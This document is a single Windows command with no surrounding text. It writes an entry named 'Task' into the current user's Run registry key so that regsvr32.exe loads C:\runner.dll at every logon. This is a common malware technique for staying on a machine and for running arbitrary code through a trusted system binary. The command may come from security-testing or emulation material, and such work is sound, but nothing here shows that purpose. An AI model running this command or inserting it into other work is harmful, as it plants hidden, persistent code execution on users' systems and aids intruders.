reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Task /t REG_SZ /d "regsvr32.exe /n /i:run C:\runner.dll" /f
